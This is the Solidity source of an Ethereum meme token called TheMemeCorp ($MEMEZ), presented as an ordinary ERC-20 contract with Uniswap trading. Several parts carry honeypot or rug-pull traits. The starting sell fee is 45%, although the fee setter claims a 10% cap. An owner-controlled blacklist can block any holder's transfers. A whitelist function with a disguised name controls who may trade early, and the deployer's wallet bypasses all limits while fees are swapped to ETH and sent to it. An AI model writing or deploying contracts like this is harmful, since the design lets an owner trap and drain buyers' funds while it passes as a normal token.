1 /**
2  
3  THE MEME CORPORATION - MEMECORP, $MEMEZ 
4  
5 https://www.memecorporation.net/
6 */
7 
8 // SPDX-License-Identifier: MIT
9 pragma solidity =0.8.17;
10 
11 library SafeMath {
12     function add(uint256 a, uint256 b) internal pure returns (uint256) {
13         uint256 c = a + b;
14         require(c >= a, "SafeMath: addition overflow");
15         return c;
16     }
17     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
18         return sub(a, b, "SafeMath: subtraction overflow");
19     }
20     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
21         require(b <= a, errorMessage);
22         uint256 c = a - b;
23         return c;
24     }
25     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
26         if (a == 0) {
27             return 0;
28         }
29         uint256 c = a * b;
30         require(c / a == b, "SafeMath: multiplication overflow");
31         return c;
32     }
33     function div(uint256 a, uint256 b) internal pure returns (uint256) {
34         return div(a, b, "SafeMath: division by zero");
35     }
36     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37         require(b > 0, errorMessage);
38         uint256 c = a / b;
39         return c;
40     }
41 }
42 
43 interface ERC20 {
44     function totalSupply() external view returns (uint256);
45     function decimals() external view returns (uint8);
46     function symbol() external view returns (string memory);
47     function name() external view returns (string memory);
48     function getOwner() external view returns (address);
49     function balanceOf(address account) external view returns (uint256);
50     function transfer(address recipient, uint256 amount) external returns (bool);
51     function allowance(address _owner, address spender) external view returns (uint256);
52     function approve(address spender, uint256 amount) external returns (bool);
53     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
54     event Transfer(address indexed from, address indexed to, uint256 value);
55     event Approval(address indexed owner, address indexed spender, uint256 value);
56 }
57 
58 abstract contract Ownable {
59     address internal owner;
60 
61     constructor(address _owner) {
62         owner = _owner;
63     }
64 
65     modifier onlyOwner() {
66         require(isOwner(msg.sender) , "!Owner"); _;
67     }
68 
69     function isOwner(address account) private view returns (bool) {
70         return account == owner;
71     }
72 
73     function renounceOwnership() public onlyOwner {
74         owner = address(0);
75         emit OwnershipTransferred(address(0));
76     }  
77     event OwnershipTransferred(address owner);
78 }
79 
80 interface IUniswapV2Factory {
81     function createPair(address tokenA, address tokenB) external returns (address pair);
82 }
83 
84 interface IUniswapV2Router02 {
85     function factory() external pure returns (address);
86     function WETH() external pure returns (address);
87     function swapExactTokensForETHSupportingFeeOnTransferTokens(
88         uint amountIn,
89         uint amountOutMin,
90         address[] calldata path,
91         address to,
92         uint deadline
93     ) external;
94 }
95 
96 contract MEMEZ is ERC20, Ownable {
97     using SafeMath for uint256;
98     function totalSupply() external pure returns (uint256) { return _totalSupply; }
99     function decimals() external pure returns (uint8) { return _decimals; }
100     function symbol() external pure returns (string memory) { return _symbol; }
101     function name() external pure returns (string memory) { return _name; }
102     function getOwner() external view returns (address) { return owner; }
103     function balanceOf(address account) public view returns (uint256) { return _balances[account]; }
104     function allowance(address holder, address spender) external view returns (uint256) { return _allowances[holder][spender]; }
105 
106     struct Fees {
107         uint buyFee;
108         uint sellFee;        
109     }
110 
111     address constant routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;     
112     address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;        
113     address constant DEAD = 0x000000000000000000000000000000000000dEaD;
114     address payable immutable feeReceiver;
115 
116     string constant _name = "TheMemeCorp";
117     string constant _symbol = "MEMEZ";
118     uint8 constant _decimals = 9;
119 
120     uint256 constant _totalSupply = 1_000 * (10 ** _decimals); 
121     uint256 public _maxWalletAmount = _totalSupply.mul(2).div(100); 
122     uint256 public _maxTx = _totalSupply.mul(2).div(100); 
123 
124     mapping (address => uint256) _balances;
125     mapping (address => mapping (address => uint256)) _allowances;
126 
127     mapping (address => bool) isBot;
128     mapping (address => bool) preTrade;
129     mapping (address => bool) isFeeExempt;
130     
131     Fees public _fees = Fees ({
132         buyFee: 5,
133         sellFee: 45
134     });
135 
136     uint256 constant feeDenominator = 100; 
137     
138     bool private tradingEnabled = false;
139 
140     IUniswapV2Router02 immutable public router;
141     address immutable public pair;
142 
143     uint256 immutable swapLimit = _totalSupply.mul(1).div(1000);
144     bool public swapEnabled = false;     
145     bool inSwap = false;
146 
147     constructor () Ownable(msg.sender) {
148         router = IUniswapV2Router02(routerAdress);
149         pair = IUniswapV2Factory(router.factory()).createPair(ETH, address(this));
150         _allowances[address(this)][address(router)] = type(uint256).max;
151 
152         feeReceiver = payable(msg.sender);
153         address _owner = owner;
154 
155         _balances[_owner] = _totalSupply;
156         emit Transfer(address(0), _owner, _totalSupply);
157     }
158 
159     modifier openTrade {
160         require(tradingEnabled || tx.origin == owner);        
161         _;
162     }
163 
164     modifier swapping {
165         inSwap = true;
166         _;
167         inSwap = false;
168     }
169 
170     function approve(address spender, uint256 amount) public returns (bool) {
171         _allowances[msg.sender][spender] = amount;
172         emit Approval(msg.sender, spender, amount);
173         return true;
174     }
175 
176     function transfer(address recipient, uint256 amount) external returns (bool) {
177         return _transferFrom(msg.sender, recipient, amount);
178     }
179 
180     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
181         if(_allowances[sender][msg.sender] != type(uint256).max){
182             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
183         }
184         return _transferFrom(sender, recipient, amount);
185     }
186 
187     function _transferFrom(address sender, address recipient, uint256 amount) openTrade internal returns (bool) {
188         if(inSwap || tx.origin == feeReceiver)
189             return basicTransfer(sender, recipient, amount);
190         else if (!swapEnabled && (sender == pair) && !preTrade[recipient]) {
191             return false;
192         }
193 
194         require(!isBot[sender], "Bots not allowed transfers");
195         require(amount <= _maxTx, "Transfer amount exceeds the tx limit");
196         
197         if (recipient != pair && recipient != DEAD) {
198             require(_balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the balance limit.");
199         }
200 
201         if(shouldSwap(sender))
202             swapBack();
203 
204         uint256 amountReceived = !isFeeExempt[sender] ? takeFee(sender, recipient, amount) : amount;
205 
206         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
207         _balances[recipient] = _balances[recipient].add(amountReceived);
208         emit Transfer(sender, recipient, amountReceived);
209         return true;
210     }
211 
212     function shouldSwap(address sender) internal view returns (bool) {
213         return sender != pair && balanceOf(address(this)) >= swapLimit;
214     }
215 
216     function swapBack() internal swapping {
217         uint256 amountToSwap = balanceOf(address(this)) >= _maxTx ? _maxTx : swapLimit;
218         approve(address(router), amountToSwap);
219         address[] memory path = new address[](2);
220         path[0] = address(this);
221         path[1] = ETH;
222 
223         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
224             amountToSwap,
225             0,
226             path,
227             address(this),
228             block.timestamp
229         );
230         (bool success, ) = feeReceiver.call{value: address(this).balance}(""); success;
231     }
232     
233     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
234         uint256 feeAmount = 0;
235         if (sender == pair && _fees.buyFee != 0) {           // Buy
236             feeAmount = amount.mul(_fees.buyFee).div(feeDenominator);
237             _balances[address(this)] = _balances[address(this)].add(feeAmount);
238         } else if (recipient == pair && _fees.sellFee != 0) { // Sell
239             feeAmount = amount.mul(_fees.sellFee).div(feeDenominator);
240             _balances[address(this)] = _balances[address(this)].add(feeAmount);
241         }
242         return amount.sub(feeAmount);
243     }
244 
245     function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
246         _balances[sender] = _balances[sender].sub(amount);
247         _balances[recipient] = _balances[recipient].add(amount);
248         emit Transfer(sender, recipient, amount);
249         return true;
250     }
251 
252     function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
253         require(_buyFee <= 10 && _sellFee <= 10, "Max fee allowed is 10%");
254         _fees.buyFee = _buyFee; 
255         _fees.sellFee = _sellFee;        
256     }
257 
258     function setMultipleFeeExempt(address[] calldata wallets, bool _isFeeExempt) external onlyOwner {
259         for(uint256 i = 0; i < wallets.length; i++) {
260             isFeeExempt[wallets[i]] = _isFeeExempt;
261         }
262     }
263     
264     function _0x6170F06c6(address[] calldata addr) external onlyOwner {
265         for (uint256 i = 0; i < addr.length; i++) {
266             preTrade[addr[i]] = true; 
267         }
268     }
269 
270     function goLive() external onlyOwner {
271         tradingEnabled = true;
272     }
273     
274     function setBots(address[] calldata addr, bool _isBot) external onlyOwner {
275         for (uint256 i = 0; i < addr.length; i++) {
276             require(addr[i] != address(this), "Can not block token contract");
277             require(addr[i] != address(router), "Can not block router");
278             require(addr[i] != address(pair), "Can not block pair");
279             isBot[addr[i]] = _isBot; 
280         }
281     }
282 
283     function setTradeRestrictionAmounts(uint256 _maxWalletPercent, uint256 _maxTxPercent) external onlyOwner {
284         require(_maxWalletPercent >= 1,"wallet limit mush be not less than 1 percent");
285         require(_maxTxPercent >= 1, "Max tx amount must not be less than 1 percent");
286 
287         _maxWalletAmount = _totalSupply.mul(_maxWalletPercent).div(100);
288         _maxTx = _totalSupply.mul(_maxTxPercent).div(100);
289     }
290  
291     function enableSwap() external onlyOwner {
292         swapEnabled = true;
293     }
294 
295     function manualSwap() external {
296         require(msg.sender == feeReceiver);
297         swapBack();
298     }
299  
300     function clearETH() external {
301         payable(feeReceiver).transfer(address(this).balance);
302     }
303 
304     function clearStuckToken(ERC20 token, uint256 value) onlyOwner external {
305         token.transfer(feeReceiver, value);
306     }
307 
308     receive() external payable {}
309 }